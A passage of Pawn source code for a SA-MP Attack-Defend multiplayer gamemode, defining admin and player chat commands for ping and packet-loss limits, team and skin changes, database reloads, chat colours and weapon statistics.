    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"Anti-Cheat.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);

	} else {
	    TextDrawSetString(ACText, sprintf("%sAC v2: ~r~Starting", MAIN_TEXT_COLOUR));
 	    TextDrawShowForAll(ACText);
		AntiCheat = true;
		format(newhostname, sizeof(newhostname), "hostname %s [AC]", hostname);
		SendRconCommand(newhostname);

		ACTimer = SetTimer("OnACStart", 60000, false);
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"Anti-Cheat.", Player[playerid][Name]);
        SendClientMessageToAll(-1, iString);

		SendClientMessageToAll(-1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
		SendClientMessageToAll(-1, "{FFFFFF}>> "COL_PRIM"Turn your {FFFFFF}Anti-Cheat "COL_PRIM"on within one minute or get kicked.");
		SendClientMessageToAll(-1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	}
    LogAdminCommand("ac", playerid, INVALID_PLAYER_ID);
	return 1;

}
#endif

/*
CMD:accheck(playerid,params[])
{
	if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new pID;

	if( sscanf(params, "d", pID) )
		return SendUsageMessage(playerid,"/acCheck [Player ID]");

    if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isnt connected.");
	if(Player[pID][Level] >= Player[playerid][Level]) return SendErrorMessage(playerid,"Can't slap someone of same or higher admin level.");

    format(iString, sizeof(iString), "AC Check {FFFFFF}enabled on player {FFFFFF}%s "COL_PRIM"by Admin {FFFFFF}\"%s\".", Player[playerid][Name]);
    SendClientMessageToAll(0x3377FF, iString);

	SendClientMessage(pID, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	SendClientMessage(pID, -1, "{FFFFFF}>> "COL_PRIM"Turn your {FFFFFF}Anti-Cheat "COL_PRIM"on within one minute or get kicked.");
	SendClientMessage(pID, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

	Player[playerid][ACCheck] = true;
	Player[playerid][ACEnabled] = 60;

    LogAdminCommand("accheck", playerid, pID);
    return 1;
}

if(Player[playerid][ACCheck] == true)
{
	if( !HaveAC )
	{
		if(Player[playerid][ACEnabled]== 30)
			SendClientMessage(pID, -1, "{FFFFFF}>> [AC Warning] "COL_PRIM" You have less than {FFFFFF}30 seconds"COL_PRIM" before getting kicked.");
		else if(Player[playerid][ACEnabled] == 10)
			SendClientMessage(pID, -1, "{FFFFFF}>> [AC Warning] "COL_PRIM" You have less than {FFFFFF}10 seconds"COL_PRIM" before getting kicked.");
		else if(Player[playerid][ACEnabled] == 1)
			SendClientMessage(pID, -1, "{FFFFFF}>> [AC Warning] "COL_PRIM" ADIOS Motherfucker!");
		else if(Player[playerid][ACEnabled] == 0)
		{
            Player[playerid][ACEnabled] = 0;
		}
	    Player[playerid][ACEnabled]--;
	}
	else
	{
	    Player[playerid][ACEnabled] = 0;
	}
}*/
#endif


CMD:serverstats(playerid, params[])
{
	new stats[450];
	GetNetworkStats(stats, sizeof(stats)); // get the servers networkstats
	ShowPlayerDialog(playerid, DIALOG_SERVER_STATS, DIALOG_STYLE_MSGBOX, "Server Network Stats", stats, "Close", "");
	return 1;
}

CMD:maxpacket(playerid, params[])
{
    if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(isnull(params)) return SendUsageMessage(playerid,"/maxpacket [Maximum Packetloss]");

	new Float:iPacket = floatstr(params);
	if(iPacket <= 0 || iPacket > 20) return SendErrorMessage(playerid,"Packetloss value can be between 0 and 20 maximum.");

	Max_Packetloss = iPacket;

	new iString[160];
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %.2f WHERE Option = 'Maximum Packetloss'", iPacket);
    db_free_result(db_query(sqliteconnection, iString));

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed maximum packet-loss to: {FFFFFF}%.2f", Player[playerid][Name], iPacket);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("maxpacket", playerid, INVALID_PLAYER_ID);
	return 1;
}



CMD:maxping(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/maxping [Maximum Ping]");

	new iPacket = strval(params);
	if(iPacket <= 0 || iPacket > 1000) return SendErrorMessage(playerid,"Ping limit can be between 0 and 1000 maximum.");

	Max_Ping = iPacket;

	new iString[180];
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Maximum Ping'", Max_Ping);
    db_free_result(db_query(sqliteconnection, iString));

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed maximum ping limit to: {FFFFFF}%d", Player[playerid][Name], iPacket);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("maxping", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:minfps(playerid, params[])
{
    if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/minfps [Minimum FPS]");

	new iPacket = strval(params);
	if(iPacket < 20 || iPacket > 90) return SendErrorMessage(playerid,"FPS limit can be between 20 and 90 maximum.");

	Min_FPS = iPacket;

	new iString[180];
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Minimum FPS'", Min_FPS);
    db_free_result(db_query(sqliteconnection, iString));

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed minimum FPS limit to: {FFFFFF}%d", Player[playerid][Name], iPacket);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("minfps", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:allvs(playerid,params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

    if(Current != -1) return SendErrorMessage(playerid,"Can't use while round is active.");
    if(isnull(params)) return SendUsageMessage(playerid,"/allvs [Team ID | 0 = Attacker, 1 = Defender] [Tag/Name]");

	new pID, TempTeamName[24];
	sscanf(params, "is", pID, TempTeamName);
    if(pID < 0 || pID > 1) return SendErrorMessage(playerid,"Invalid team ID.");


    new PlayersAvailable, iString[160];
	new bool:PlayersToTeam[MAX_PLAYERS] = false;

    foreach(new i : Player) {
        if(strfind(Player[i][Name], TempTeamName, true) != -1 && (Player[i][Team] == ATTACKER || Player[i][Team] == DEFENDER)) {
            PlayersAvailable++;
            PlayersToTeam[i] = true;
        }
    }
    if(PlayersAvailable < 1) return SendErrorMessage(playerid,"No players match specified tag/name.");

	foreach(new i : Player) {

		new MyVehicle = -1;
		new Seat;

		if(IsPlayerInAnyVehicle(i)) {
			MyVehicle = GetPlayerVehicleID(i);
			Seat = GetPlayerVehicleSeat(i);
		}


		if(PlayersToTeam[i] == true) {
			if(pID == 0) {
			    Player[i][Team] = ATTACKER;
			    SetPlayerColor(i, ATTACKER_NOT_PLAYING);
			} else {
			    Player[i][Team] = DEFENDER;
			    SetPlayerColor(i, DEFENDER_NOT_PLAYING);
			}
		} else {
		    if(pID == 1) {
		        Player[i][Team] = ATTACKER;
		        SetPlayerColor(i, ATTACKER_NOT_PLAYING);
			} else {
				Player[i][Team] = DEFENDER;
				SetPlayerColor(i, DEFENDER_NOT_PLAYING);
			}
		}
		SetPlayerSkin(i, Skin[Player[i][Team]]);
        ClearAnimations(i);


		if(MyVehicle != -1) {
		    PutPlayerInVehicle(i, MyVehicle, Seat);

			if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
				switch(Player[i][Team]) {
					case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(i), 175, 175);
					case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(i), 158, 158);
					case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(i), 198, 198);
					case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(i), 208, 208);
					case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(i), 200, 200);
				}
			}
		}
    }

    format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has changed the teams to {FFFFFF}\"%s\" vs all.", Player[playerid][Name], TempTeamName);
    SendClientMessageToAll(-1, iString);
    return 1;
}


CMD:move(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

    new iString[160], pID[2];
    if(sscanf(params, "dd", pID[0], pID[1])) return SendUsageMessage(playerid,"/move [PlayerToMove ID] [PlayerToMoveTo ID]");
	if(!IsPlayerConnected(pID[0]) || !IsPlayerConnected(pID[1])) return SendErrorMessage(playerid,"One of the player IDs you used is not connected.");

    new Float:Pos[3];
    GetPlayerPos(pID[1], Pos[0], Pos[1], Pos[2]);

    SetPlayerInterior(pID[0], GetPlayerInterior(pID[1]));
    SetPlayerVirtualWorld(pID[0], GetPlayerVirtualWorld(pID[1]));

    if(GetPlayerState(pID[0]) == 2) {
	    SetVehiclePos(GetPlayerVehicleID(pID[0]), Pos[0]+3, Pos[1], Pos[2]);
		LinkVehicleToInterior(GetPlayerVehicleID(pID[0]),GetPlayerInterior(pID[1]));
	    SetVehicleVirtualWorld(GetPlayerVehicleID(pID[0]),GetPlayerVirtualWorld(pID[1]));
    }
    else SetPlayerPos(pID[0], Pos[0]+2, Pos[1], Pos[2]);

    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has moved {FFFFFF}%s "COL_PRIM"to {FFFFFF}%s", Player[playerid][Name], Player[pID[0]][Name], Player[pID[1]][Name]);
    SendClientMessageToAll( -1, iString);
    LogAdminCommand("move", playerid, pID[0]);
    return 1;
}

CMD:shortcuts(playerid, params[])
{
    new Params[64], iString[128], CommandID;
	sscanf(params, "s", Params);

	if(isnull(Params)) {
		ShowPlayerDialog(playerid, EDITSHORTCUTS_DIALOG, DIALOG_STYLE_LIST, "Editing shortcuts", sprintf("Num2: %s\nNum4: %s\nNum6: %s\nNum8: %s", PlayerShortcut[playerid][Shortcut1], PlayerShortcut[playerid][Shortcut2], PlayerShortcut[playerid][Shortcut3], PlayerShortcut[playerid][Shortcut4]), "Edit", "Cancel");
	} else {
	    if(Player[playerid][Level] < 1) return SendErrorMessage(playerid,"You need to be a higher level admin to do that.");
		if(strcmp(Params, "on", true) == 0) CommandID = 1;
		else if(strcmp(Params, "off", true) == 0) CommandID = 2;
		else return SendUsageMessage(playerid,"/shortcuts [on | off]");

		switch(CommandID) {
			case 1: {
			    ShortCuts = true;
	    		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"shortcut team messages.", Player[playerid][Name]);
				SendClientMessageToAll(-1, iString);
			} case 2: {
			    ShortCuts = false;
	    		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"shortcut team messages.", Player[playerid][Name]);
				SendClientMessageToAll(-1, iString);
			}
		}
	}
	LogAdminCommand("shortcuts", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:jetpack(playerid,params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't use this command in round.");

    new pID = strval(params);
	if(isnull(params)) pID = playerid;

    if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");

	new iString[128];
    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"gave a jetpack to {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	SendClientMessageToAll(-1, iString);

    SetPlayerSpecialAction(pID, 2);
    return 1;
}

CMD:help(playerid, params[])
{
	HelpString = "";
	strcat(HelpString, ""COL_PRIM"Attack-Defend Gamemode Created By: {FFFFFF}062_ "COL_PRIM"and {FFFFFF}Whitetiger");
	strcat(HelpString, "\n"COL_PRIM"For detailed credits about development team, type {FFFFFF}/credits");
	strcat(HelpString, "\n\n{0044FF}Match-Mode Help:");
	strcat(HelpString, "\n"COL_PRIM"To enable Match-Mode, press {FFFFFF}'Y' "COL_PRIM"in lobby or {FFFFFF}'H' "COL_PRIM"in round and most textdraws will be clickable.");
	strcat(HelpString, "\nAlternatively, just type {FFFFFF}/war [Team A] [Team B] "COL_PRIM"to enable the Match-Mode and type {FFFFFF}/war end "COL_PRIM"to disable it.");
	strcat(HelpString, "\nOnce Match-Mode is enabled, team names and score, current and total rounds can be changed by clicking on their textdraw.");
	strcat(HelpString, "\nOther useful commands for match: {FFFFFF}/tr (Total Rounds), /cr (Current Round), /hl (Heal All), /al (Armour All), /replace, /sethp, /setarmour");
	strcat(HelpString, "\n/start [Base | Arena] and /random [Base | Arena], /setteam, /setscore, /teamname");
	strcat(HelpString, "\n\n{0044FF}Server Help:");
	strcat(HelpString, "\n"COL_PRIM"For any admin commands, type {FFFFFF}/acmds "COL_PRIM"and for public commands type {FFFFFF}/cmds");
	strcat(HelpString, "\n"COL_PRIM"Round can be paused by pressing {FFFFFF}'Y' "COL_PRIM"(for admins only).");
	strcat(HelpString, "\nYou can request for backup from your team by pressing {FFFFFF}'N' "COL_PRIM"in round.");
	strcat(HelpString, "\nYou can ask for pausing the round by pressing {FFFFFF}'Y' "COL_PRIM"in round.");

	ShowPlayerDialog(playerid,DIALOG_SERVER_HELP,DIALOG_STYLE_MSGBOX,"{0044FF}Server Help", HelpString, "OK","");

	return 1;
}

CMD:deathmessage(playerid, params[])
{
	return cmd_deathdiss(playerid, params);
}

CMD:deathdiss(playerid, params[])
{
    if(isnull(params)) return SendUsageMessage(playerid,"/deathdiss [Message]");
	if(strlen(params) <= 3) return SendErrorMessage(playerid,"Too short!");
	if(strlen(params) >= 64) return SendErrorMessage(playerid,"Too long!");

	new iString[128];
	format(DeathMessageStr[playerid], 64, "%s", params);
	format(iString, sizeof(iString), "UPDATE `Players` SET `DeathMessage` = '%s' WHERE `Name` = '%s'", DB_Escape(params), DB_Escape(Player[playerid][Name]) );
	db_free_result(db_query(sqliteconnection, iString));
	SendClientMessage(playerid, -1, "Death diss message has been changed successfully!");
	return 1;
}

CMD:fightstyle(playerid, params[])
{
    if(isnull(params) || !IsNumeric(params))
	{
		SendUsageMessage(playerid,"/fightstyle [FightStyle ID]");
		SendClientMessage(playerid, -1, "0 Normal | 1 Boxing | 2 KungFu | 3 Knee-head | 4 Grab-kick | 5 Elbow-kick");
		return 1;
	}
	new fsID = strval(params);
	if(fsID < 0 || fsID > 5) return SendErrorMessage(playerid,"Invalid FightStyle ID (From 0 to 5 are valid)");

	Player[playerid][FightStyle] = FightStyleIDs[fsID];
	SetPlayerFightingStyle(playerid, Player[playerid][FightStyle]);
	new iString[128];
	format(iString, sizeof(iString), "UPDATE `Players` SET `FightStyle` = '%d' WHERE `Name` = '%s'", Player[playerid][FightStyle], DB_Escape(Player[playerid][Name]) );
	db_free_result(db_query(sqliteconnection, iString));
	SendClientMessage(playerid, -1, sprintf(""COL_PRIM"FightStyle changed to: {FFFFFF}%s", FightStyleNames[fsID]));
	return 1;
}

new bool:DatabaseSetToReload = false;

forward ReloadDatabase();
public ReloadDatabase()
{
    sqliteconnection = db_open("AAD.db");
    DatabaseSetToReload = false;
    SendClientMessageToAll(-1, ""COL_PRIM"SQLite database has been reloaded successfully.");
	return 1;
}

SetDatabaseToReload(playerid = INVALID_PLAYER_ID)
{
	if(playerid != INVALID_PLAYER_ID)
		SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has set the SQLite database to reload.", Player[playerid][Name]));
		
	DatabaseSetToReload = true;
	db_close(sqliteconnection);
	SetTimer("ReloadDatabase", 100, false);
	return 1;
}

CMD:reloaddb(playerid, params[])
{
    if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(DatabaseSetToReload == true)
		return SendErrorMessage(playerid, "Database is already set to reload.");
	SetDatabaseToReload(playerid);
	return 1;
}

forward FakePacketRenovationEnd(playerid, Float:fakepacket);
public FakePacketRenovationEnd(playerid, Float:fakepacket)
{
    Player[playerid][FakePacketRenovation] = false;
    SendClientMessageToAll(-1, sprintf(""COL_PRIM"Fake packetloss renovation on {FFFFFF}%s "COL_PRIM"has ended - Old: {FFFFFF}%.1f "COL_PRIM" | Current: {FFFFFF}%.1f", Player[playerid][Name], fakepacket, GetPlayerPacketLoss(playerid)));
	return 1;
}

CMD:fakepacket(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new pID, interv;
	if(sscanf(params, "id", pID, interv)) return SendUsageMessage(playerid,"/fakepacket [Player ID] [Time in minutes]");
	if(interv <= 0 || interv > 5)  return SendErrorMessage(playerid,"Invalid (Min: 1 | Max: 5).");
	if(Player[pID][FakePacketRenovation])  return SendErrorMessage(playerid,"Player is already on fake packetloss renovation.");
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");

	SetTimerEx("FakePacketRenovationEnd", interv * 60 * 1000, false, "if", pID, GetPlayerPacketLoss(pID));
	Player[pID][FakePacketRenovation] = true;

	SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has started fake packetloss renovation on {FFFFFF}%s "COL_PRIM" - Interval: {FFFFFF}%d min(s).",Player[playerid][Name], Player[pID][Name], interv));

    LogAdminCommand("fakepacket", playerid, pID);
	return 1;
}

stock SetWeaponStatsString()
{
	format(WeaponStatsStr, sizeof WeaponStatsStr, "");
	foreach(new i : Player)
	{
	    if((Player[i][WeaponStat][WEAPON_DEAGLE] + Player[i][WeaponStat][WEAPON_SHOTGUN] + Player[i][WeaponStat][WEAPON_M4] + Player[i][WeaponStat][WEAPON_SHOTGSPA] + Player[i][WeaponStat][WEAPON_RIFLE] + Player[i][WeaponStat][WEAPON_SNIPER] + Player[i][WeaponStat][WEAPON_AK47] + Player[i][WeaponStat][WEAPON_MP5] + Player[i][WeaponStat][0]) <= 0)
			continue;

		format(WeaponStatsStr, sizeof WeaponStatsStr, "%s{0066FF}%s {D6D6D6}[Deagle: %d] [Shotgun: %d] [M4: %d] [Spas: %d] [Rifle: %d] [Sniper: %d] [AK: %d] [MP5: %d] [Punch: %d] [Rounds: %d]\n",
			WeaponStatsStr, Player[i][Name], Player[i][WeaponStat][WEAPON_DEAGLE], Player[i][WeaponStat][WEAPON_SHOTGUN], Player[i][WeaponStat][WEAPON_M4], Player[i][WeaponStat][WEAPON_SHOTGSPA], Player[i][WeaponStat][WEAPON_RIFLE], Player[i][WeaponStat][WEAPON_SNIPER], Player[i][WeaponStat][WEAPON_AK47], Player[i][WeaponStat][WEAPON_MP5], Player[i][WeaponStat][0], Player[i][RoundPlayed]);
	}

	for(new i = 0; i < SAVE_SLOTS; i ++)
	{
		if(strlen(SaveVariables[i][pName]) > 2)
		{
		    if((SaveVariables[i][WeaponStat][WEAPON_DEAGLE] + SaveVariables[i][WeaponStat][WEAPON_SHOTGUN] + SaveVariables[i][WeaponStat][WEAPON_M4] + SaveVariables[i][WeaponStat][WEAPON_SHOTGSPA] + SaveVariables[i][WeaponStat][WEAPON_RIFLE] + SaveVariables[i][WeaponStat][WEAPON_SNIPER] + SaveVariables[i][WeaponStat][WEAPON_AK47] + SaveVariables[i][WeaponStat][WEAPON_MP5] + SaveVariables[i][WeaponStat][0]) <= 0)
				continue;

			format(WeaponStatsStr, sizeof WeaponStatsStr, "%s{0066FF}%s {D6D6D6}[Deagle: %d] [Shotgun: %d] [M4: %d] [Spas: %d] [Rifle: %d] [Sniper: %d] [AK: %d] [MP5: %d] [Punch: %d] [Rounds: %d]\n",
				WeaponStatsStr, SaveVariables[i][pName], SaveVariables[i][WeaponStat][WEAPON_DEAGLE], SaveVariables[i][WeaponStat][WEAPON_SHOTGUN], SaveVariables[i][WeaponStat][WEAPON_M4], SaveVariables[i][WeaponStat][WEAPON_SHOTGSPA], SaveVariables[i][WeaponStat][WEAPON_RIFLE], SaveVariables[i][WeaponStat][WEAPON_SNIPER], SaveVariables[i][WeaponStat][WEAPON_AK47], SaveVariables[i][WeaponStat][WEAPON_MP5], SaveVariables[i][WeaponStat][0], SaveVariables[i][TPlayed]);
		}
	}
	return 1;
}

CMD:weaponstats(playerid, params[])
{
	ShowPlayerDialog(playerid, DIALOG_NO_RESPONSE, DIALOG_STYLE_MSGBOX, "Players Weapon Statistics", WeaponStatsStr, "Close", "");
	return 1;
}

CMD:alladmins(playerid, params[])
{
    new DBResult:res = db_query(sqliteconnection, "SELECT * FROM Players WHERE LEVEL < 6 AND LEVEL > 0 ORDER BY Level DESC");
	new holdStr[64];
	new bigStr[512];

	do
	{
	    db_get_field_assoc(res, "Name", holdStr, sizeof(holdStr));
		printf("Name: %s", holdStr);
		format(bigStr, sizeof bigStr, "%s%s", bigStr, holdStr);
		db_get_field_assoc(res, "Level", holdStr, sizeof(holdStr));
		format(bigStr, sizeof bigStr, "%s [%d]\n", bigStr, strval(holdStr));
	}
	while(db_next_row(res));
	db_free_result(res);
	ShowPlayerDialog(playerid, DIALOG_NO_RESPONSE, DIALOG_STYLE_MSGBOX, "All Server Admins", bigStr, "Okay", "");
	return 1;
}

/* Changes Occurance of COL_PRIM to value contained in ColScheme */
CMD:chatcolor(playerid,params[])
{
	new col[7];

	if( !isnull(params) && !strcmp(params,"01A2F8",true) )
	{
		params[0] = '\0';
	    strcat(params,"01A2F7",7);
	}
	if( strlen(params) != 6 || sscanf(params,"h",col) )
	{
	    SendErrorMessage(playerid,"Please Enter a Valid Hex color code.");
	    new bigString[512];
	    new colorList[] = // enter as much colors here
		{
		    0x01BA2F8FF, 0x0044FFFF, 0xF36164FF
		};
	    strcat( bigString, "\t\tSyntax: /ChatColor ColorCode || E.g: /ChatColor 0044FF\t\t\t\n{EBEBEB}Some Examples:\n",sizeof(bigString) );

		for(new i = 0, tmpint = 0; i < sizeof(colorList); i++)
		{
			tmpint = colorList[i] >> 8 & 0x00FFFFFF;
			format( bigString, sizeof(bigString), "%s{%06x}%06x   ", bigString, tmpint, tmpint );
			if( i == 9 ) strcat( bigString, "\n", sizeof(bigString) );
		}

		strcat( bigString, "\n\nHex Code need to have 6 Digits and can contain only number from 0 - 9 and letters A - F", sizeof(bigString) );
   	    strcat( bigString, "\n\t{01A2F8}You can get some color codes from websites like: Www.ColorPicker.Com \n\t\t{37B6FA}Notice: In-Game Colors might appear different from website.\n", sizeof(bigString) );

		ShowPlayerDialog(playerid,DIALOG_HELPS,DIALOG_STYLE_MSGBOX, "Hints for the command.", bigString, "Close", "" );
		return 1;
	}
    if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be level 4 or rcon admin.");

	format(ColScheme,10,"{%06x}", col);
	//printf("ColScheme Changed to: %s %x", ColScheme, col );
	new iString[128];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed {FFFFFF}Chat Color to "COL_PRIM"%06x", Player[playerid][Name], col );
	SendClientMessageToAll(-1, iString);

	format(iString, sizeof(iString), "UPDATE `Configs` SET `Value` = '%06x' WHERE `Option` = 'ChatColor'", col);
    db_free_result(db_query(sqliteconnection, iString));

	return 1;
}


CMD:themes(playerid, params[])
{
    if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be level 5 or rcon admin.");

    new str[512];
	strcat(str, "White (Background) & Black (Text)\n");
	strcat(str, "Black (Background) & White (Text)\n");
	strcat(str, "White (Background) & Red (Text)\n");
	strcat(str, "Black (Background) & Red (Text)\n");
	strcat(str, "White (Background) & Blue (Text)\n");
	strcat(str, "Black (Background) & Blue (Text)\n");
	strcat(str, "White (Background) & Green (Text)\n");
	strcat(str, "Black (Background) & Green (Text)\n");
	strcat(str, "White (Background) & Purple (Text)\n");
	strcat(str, "Black (Background) & Purple (Text)");

	ShowPlayerDialog(playerid, DIALOG_THEME_CHANGE1, DIALOG_STYLE_LIST, "{0044FF} Theme colour menu", str, "Select", "Cancel");
	return 1;
}

CMD:defaultskins(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new iString[128];

	Skin[ATTACKER] = 170;
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Attacker Skin'", 170);
    db_free_result(db_query(sqliteconnection, iString));

	Skin[DEFENDER] = 176;
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Defender Skin'", 176);
    db_free_result(db_query(sqliteconnection, iString));

	Skin[REFEREE] = 51;
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Referee Skin'", 51);
    db_free_result(db_query(sqliteconnection, iString));


	foreach(new i : Player) {
	    if(Player[i][Team] == ATTACKER) {
	        SetPlayerSkin(i, Skin[ATTACKER]);
			ClearAnimations(i);
		}
		if(Player[i][Team] == DEFENDER) {
	        SetPlayerSkin(i, Skin[DEFENDER]);
			ClearAnimations(i);
		}
		if(Player[i][Team] == REFEREE) {
	        SetPlayerSkin(i, Skin[REFEREE]);
			ClearAnimations(i);
		}
	}

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed {FFFFFF}skins "COL_PRIM"to default.", Player[playerid][Name] );
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("defaultskins", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:teamskin(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new Params[2];
	if(sscanf(params, "dd", Params[0], Params[1])) return SendUsageMessage(playerid,"/teamskin [Team ID | 0 Attacker | 1 Defender | 2 Referee] [Skin]");
	if(Params[0] < 0 || Params[0] > 2) return SendErrorMessage(playerid,"Invalid team ID.");
	if(IsInvalidSkin(Params[1])) return SendErrorMessage(playerid,"Invalid skin ID.");

	new iString[128];
	switch(Params[0]) {
	    case ATTACKER-1: {
	        Skin[ATTACKER] = Params[1];

			format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Attacker Skin'", Skin[ATTACKER]);
		    db_free_result(db_query(sqliteconnection, iString));

	    } case DEFENDER-1: {
	        Skin[DEFENDER] = Params[1];

			format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Defender Skin'", Skin[DEFENDER]);
		    db_free_result(db_query(sqliteconnection, iString));

	    } case REFEREE-1: {
	        Skin[REFEREE] = Params[1];

			format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Referee Skin'", Skin[REFEREE]);
		    db_free_result(db_query(sqliteconnection, iString));
	    }
	}

	foreach(new i : Player) {
	    if(Player[i][Team] == Params[0]+1) {
	        SetPlayerSkin(i, Params[1]);
			ClearAnimations(i);
		}
	}

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed {FFFFFF}%s "COL_PRIM"skin to: {FFFFFF}%d", Player[playerid][Name], TeamName[Params[0]+1], Skin[Params[0]+1]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("teamskin", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:setteam(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new Params[2];
	if(sscanf(params, "dd", Params[0], Params[1])) return SendUsageMessage(playerid,"/setteam [Player ID] [Team ID | 0 Att | 1 Def | 2 Ref | 3 Att_Sub | 4 Def_Sub]");

	if(Params[1] < 0 || Params[1] > 4) return SendErrorMessage(playerid,"Invalid team ID.");
	if(!IsPlayerConnected(Params[0])) return SendErrorMessage(playerid,"That player isn't connected.");
	if(Player[Params[0]][Playing] == true) return SendErrorMessage(playerid,"That player is playing.");

	new MyVehicle = -1;
	new Seat;

	if(IsPlayerInAnyVehicle(Params[0])) {
		MyVehicle = GetPlayerVehicleID(Params[0]);
		Seat = GetPlayerVehicleSeat(Params[0]);
	}

	Player[Params[0]][Team] = Params[1]+1;
	SetPlayerSkin(Params[0], Skin[Params[1]+1]);
	ColorFix(Params[0]);
	ClearAnimations(Params[0]);

	if(Current != -1 && TeamHPDamage == true) {
		if(Player[Params[0]][Team] == ATTACKER || Player[Params[0]][Team] == ATTACKER_SUB) {
            TextDrawShowForPlayer(Params[0], AttackerTeam[0]);
            TextDrawShowForPlayer(Params[0], AttackerTeam[1]);
   			TextDrawHideForPlayer(Params[0], DefenderTeam[0]);
   			TextDrawHideForPlayer(Params[0], DefenderTeam[1]);
		} else if(Player[Params[0]][Team] == DEFENDER || Player[Params[0]][Team] == DEFENDER_SUB) {
            TextDrawShowForPlayer(Params[0], DefenderTeam[0]);
            TextDrawShowForPlayer(Params[0], DefenderTeam[1]);
   			TextDrawHideForPlayer(Params[0], AttackerTeam[0]);
   			TextDrawHideForPlayer(Params[0], AttackerTeam[1]);
       	} else {
